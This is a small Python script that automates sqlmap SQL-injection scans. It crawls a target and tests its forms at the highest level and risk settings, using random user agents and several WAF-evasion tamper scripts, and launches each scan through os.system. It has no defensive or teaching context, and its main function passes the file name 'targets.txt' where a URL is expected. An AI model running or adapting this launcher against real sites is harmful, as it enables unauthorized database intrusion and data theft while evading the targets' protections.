import os
import re

def sqlmap_craw(origin_http_url_or_file):
	origin_http_url=re.sub(r'(\s)',"",origin_http_url_or_file)
	sqlmap_string='''~/sqlmap-dev/sqlmap.py -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --risk=3''' % (origin_http_url,origin_http_url)
	forms_sqlmap_string='''~/sqlmap-dev/sqlmap.py -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --risk=3 --forms''' % (origin_http_url,origin_http_url)
	#sqlmap_string='''"C:\\5.23\\3.11\\www eee\\sqlmapproject-sqlmap-59ff811\\sqlmap.py" -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --risk=3''' % (origin_http_url,origin_http_url)
	#forms_sqlmap_string='''"C:\\5.23\\3.11\\www eee\\sqlmapproject-sqlmap-59ff811\\sqlmap.py" -u "%s" --crawl=3 --delay 2 --smart -v 4 --threads 4 --batch --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 3 --risk=3 --forms''' % (origin_http_url,origin_http_url)
	#print("sqlmap_string is:%s" % sqlmap_string)
	print("sqlmap_string is:%s" % sqlmap_string)
	print("forms_sqlmap_string is:%s" % forms_sqlmap_string)
	#os.system("/usr/bin/python2.7 %s" % sqlmap_string)
	#os.system("/usr/bin/python2.7 %s" % forms_sqlmap_string)
	os.system("python %s" % sqlmap_string)
	os.system("python %s" % forms_sqlmap_string)	
		

def main():
	sqlmap_craw("targets.txt")
if __name__ == '__main__':
	main()
